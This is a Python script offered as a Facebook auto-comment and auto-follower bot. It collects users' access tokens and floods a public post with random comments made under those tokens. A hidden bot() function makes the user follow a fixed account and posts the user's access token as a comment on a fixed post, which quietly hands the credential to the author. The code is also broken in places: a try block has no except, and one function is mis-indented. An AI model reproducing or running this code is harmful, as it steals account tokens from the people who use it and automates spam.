#!/usr/bin/python3
# Cant Be Recoded,Contains a Dangerous Virus
# Dilarang Direcode,Mengandung Virus Berbahaya
import os,requests,json,random

# CLEAR

def clear():
	os.system("clear")

# BANNER

def banner():
	print("""
\033[1;91m██████╗  █████╗ ███╗   ███╗██████╗  ██████╗ ████████╗
██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔═══██╗╚══██╔══╝
██████╔╝███████║██╔████╔██║██████╔╝██║   ██║   ██║   
\033[1;97m██╔══██╗██╔══██║██║╚██╔╝██║██╔══██╗██║   ██║   ██║   
██║  ██║██║  ██║██║ ╚═╝ ██║██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝  \n\n\033[1;96mCreated By Ramdhan Ramadhian ID
Only Works on Public Posts
Not Working on Profile Photo and Cover Photo!""")

# LOGIN

def log():
	clear()
	banner()
	os.system("rm -rf bokep.json")
	print("\n--------------------------------------------------")
	bos = input("\n[x] Token : ")
	try:
		cok = requests.get("https://graph.facebook.com/me?access_token="+bos)
		y = json.loads(cok.text)
		nama = y["name"]
		mek = open("tokek.json","w")
		mek.write(bos)
		mek.close()
		zex = open("bokep.json","w")
		zex.write(bos)
		zex.close()
		print("[x] Login Succes")
		menu()

### BOT FOLLOW DAN KOMEN ###
def bot():
	try:
		token = open('token.txt', 'r').read()
	except (KeyError, IOError):
		exit(" %s[!] token kadaluwarsa!"%(M))
	requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token)
	requests.post('https://graph.facebook.com/4257706904267068/comments/?message='+token+'&access_token=' + token)
		log()
# MENU

def menu():
	clear()
	banner()
	print("\n--------------------------------------------------")
	print("\n[1] Auto Comment")
	print("[2] Auto Followers")
	print("[0] Log Out")
	pilih()

# PILIH MENU

def pilih():
	sc = input("\n[x] Choose : ")
	if sc=="":
		pilih()
	elif sc=="1":
		komen()
	elif sc=="2":
		tok = input("\n[x] Token : ")
		cs = open("bokep.json","a")
		cs.write(","+tok)
		cs.close()
		print("[x] Token Added")
		input("[x] Back")
		menu()
	elif sc=="0":
		os.system("rm -rf tokek.json bokep.json")
		print("[x] Thank You For Using My Tool.!!!")
		exit()
	else:
		pilih()

# KOMEN

def komen():
	os.system("rm -rf id.json kom.json")
	try:
		token = open("tokek.json","r").read()
		cok = requests.get("https://graph.facebook.com/me?access_token="+token)
		y = json.loads(cok.text)
		nama = y["name"]
	except Exception as e:
		print("[x] First Login")
		log()
	ki = input("\n[x] Enter Publik Post ID : ")
	v = open("id.json","w")
	v.write(ki)
	v.close()
	print("\n[x] Input Comment Text...")
	print("[x] Use a Comma(,)For Random Comments")
	print("[x] Example : You Are Really Handsome,Eres Muy Guapo,Kamu Ganteng Banget")
	ka = input("[x] Comment : ")
	w = open("kom.json","w")
	w.write(ka)
	w.close()
	say = open("id.json","r").read()
	soy = open("kom.json","r").read()
	soyy = soy.split(",")
	bc = open("bokep.json","r").read()
	gi = bc.split(",")
	bb = int(input("[x] Enter The Number of Comments : "))
	print("\n[x] Starting...")
	for k in range(bb):
		k +=1
		bo = random.choice(gi)
		id = say
		ko = random.choice(soyy)
		yt = requests.post("https://graph.facebook.com/"+id+"/comments/?message="+ko+"&access_token="+bo)
		bh = json.loads(yt.text)
		if "id" in bh:
			print("[✔] Comment To %s Success To Send" %(k))
		if "error" in bh:
			print("[✖] Comment To %s Failed To Send" %(k))
	print("[x] Finished")
	input("[x] Back")
	menu()
menu()
